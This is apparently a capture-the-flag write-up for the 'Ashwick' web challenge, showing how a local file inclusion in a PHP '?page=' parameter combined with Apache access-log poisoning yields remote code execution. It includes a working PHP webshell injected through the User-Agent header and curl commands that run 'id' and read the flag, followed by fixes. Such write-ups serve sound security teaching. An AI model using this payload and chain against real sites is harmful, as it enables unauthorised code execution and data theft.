---
layout: post
title: "Ashwick"
date: 2026-07-13
description: How a local file inclusion vulnerability combined with Apache access log poisoning achieved remote code execution on the Township of Ashwick challenge.
tags: [ctf, web, lfi, rce, log-poisoning, php, webverse]
categories: writeups
---

## Challenge Overview

**Platform:** [Webverse Labs](https://dashboard.webverselabs-pro.com/events/ashwick)  
**Category:** Web  
**Difficulty:** Easy  
**Try it yourself:** [Township of Ashwick](https://dashboard.webverselabs-pro.com/events/ashwick)

Ashwick is a fake local government website built with PHP. It has a `?page=` parameter that loads different pages. The goal is to get remote code execution and read the flag.

---

## Recon

The site loads pages like this:

```
https://target/?page=home
https://target/?page=about
```

I ran a quick directory scan and found two folders:

```
/pages/   → 403
/logs/    → 403
```

Both folders exist but you can not list them directly. I then checked if any log files were inside `/logs/`:

```bash
for name in access.log error.log app.log debug.log; do
  echo -n "$name: "
  curl -s -o /dev/null -w "%{http_code}\n" "https://target/logs/$name"
done
```

Result:
```
access.log: 200
error.log: 404
app.log: 404
debug.log: 404
```

`/logs/access.log` exists and is readable.

---

## Finding the LFI

I tested the `page` parameter with a path traversal payload to see if it would load files outside the `pages/` folder:

```
https://target/?page=../logs/access.log
```

The server responded with a PHP error:

```
Parse error: syntax error in /var/www/html/logs/access.log on line 59
```

This is actually good news. It means:
- The file is being loaded and **executed as PHP** — that is the LFI
- The path traversal `../` works to escape the `pages/` folder
- The error just means the log file contains something PHP cannot parse yet

---

## Poisoning the Log

Apache saves the User-Agent header from every request into `access.log`. Since the log gets included and run as PHP, I can inject PHP code into my User-Agent and it will execute.

I sent this request:

```bash
curl -s -A "<?php system(\$_GET['cmd']); ?>" \
  "https://target/" -o /dev/null
```

This writes a line like this into the log:

```
10.10.0.1 - - [13/Jul/2026] "GET / HTTP/1.1" 200 "-" "<?php system($_GET['cmd']); ?>"
```

Now the log file contains a PHP webshell.

---

## Getting RCE

With the webshell in the log, I triggered it by loading the log via LFI and passing a command:

**Check who I am:**
```bash
curl -s "https://target/?page=../logs/access.log&cmd=id"
# → uid=1108(ashwick) gid=999(ashwick) groups=999(ashwick)
```

**Read the flag:**
```bash
curl -s "https://target/?page=../logs/access.log&cmd=cat+/flag.txt"
# → WEBVERSE{****************************REDACTED****************************}
```

---

## Attack Chain

```
page= parameter loads files from pages/
           ↓
../logs/access.log escapes the pages/ folder
           ↓
Log file gets included and run as PHP
           ↓
PHP webshell injected via User-Agent header
           ↓
Webshell lands in access.log
           ↓
LFI loads the log → webshell executes
           ↓
RCE as ashwick → read /flag.txt → flag!
```

---

## Automation Script

I wrote a Python script that does the full attack automatically after i solved it:

```bash
python3 ashwick_solve.py https://<your-instance-url>/
```

Output:
```
[+] RCE confirmed: uid=1108(ashwick) gid=999(ashwick) groups=999(ashwick)
[+] FLAG: WEBVERSE{****************************REDACTED****************************}
```

The script injects the webshell, confirms RCE, then reads the flag. It uses output markers to cleanly separate the command result from the surrounding log entries in the response.

---

## Why This Works

The developer made two mistakes:

1. **The `page` parameter passes user input directly to `include()`** without checking that the file is inside the allowed folder
2. **The logs folder is inside the webroot** so log files can be loaded via the web server

These two issues together make log poisoning possible.

---

## How to Fix It

- **Whitelist allowed page names** — only accept known values like `home`, `about`, `contact` rather than any filename
- **Move logs outside the webroot** — logs should never be accessible via a browser
- **Disable dangerous PHP functions** — add `system`, `exec`, `shell_exec` to `disable_functions` in `php.ini`

---

## Flag

```
WEBVERSE{****************************REDACTED****************************}
```

---

*Want to try this challenge yourself? [Ashwick on Webverse Labs](https://dashboard.webverselabs-pro.com/events/ashwick)*
